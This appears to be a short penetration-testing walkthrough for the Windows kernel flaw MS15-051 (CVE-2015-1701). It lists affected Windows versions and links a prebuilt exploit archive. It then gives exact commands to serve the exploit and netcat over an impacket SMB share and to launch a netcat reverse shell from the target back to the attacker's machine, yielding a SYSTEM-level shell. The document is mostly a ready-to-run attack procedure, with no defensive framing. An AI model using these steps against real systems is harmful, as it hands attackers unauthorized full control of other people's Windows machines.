| CVE / MS  | Title | Vulns |
| --------- | ----- | ----- |
| CVE-2015-1701 / MS15-051 | ClientCopyImage Win32k | win_vista sp_2 arc_x64,win_8 arc_x64,win_server_2008 sp_2 arc_x64,win_8 arc_x86,win_server_2012 arc_x86,win_server_2003 sp_2 arc_x64,win_server_2008 sp_1 arc_x64,win_8.1 arc_x86,win_8.1 arc_x64,win_10 sp_1 arc_x86,win_server_2008 sp_2 arc_x86,win_vista sp_2 arc_x86,win_server_2003 sp_2 arc_x86,win_10 sp_1 arc_x64,win_server_2008 sp_1 arc_x86 |

<br><br>


Download the [MS15-051-KB3045171.zip](https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip
) file and extract. Depending on target OS structure use ms15-051.exe or ms15-051x64.exe. In my case I used ms15-051x64.exe on a Windows 2008 R2 x64 target.<br>
Start a samba server on your local machine using impacket-smbserver

```sh
sudo impacket-smbserver myshare `pwd` -smb2
```

We can directly execute the file from the smb server. The exe takes any command as argument and executes it, we'll send a reverse shell back to us as System! first copy a netcat binary exe to your smbserver directory so that we can access that as well. Next we start a netcat listener to catch the System shell on port 9001 because a great Prince once said, [its Over 9000!](https://www.youtube.com/watch?v=SiMHTK15Pik) <br>Then we execute the following on target shell :

```sh
\\<Your-Machine-IP>\myshare\ms15-051x64.exe "\\<Your-Machine-IP>\myshare\nc64.exe <Your-Machine-IP> 9001 -e cmd"
```
note: make sure the binary exe file names are same as your files in your local directory. <br>
Alternatively, we can upload the exe to the target system first and execute. Now you have a System Shell! Enjoy!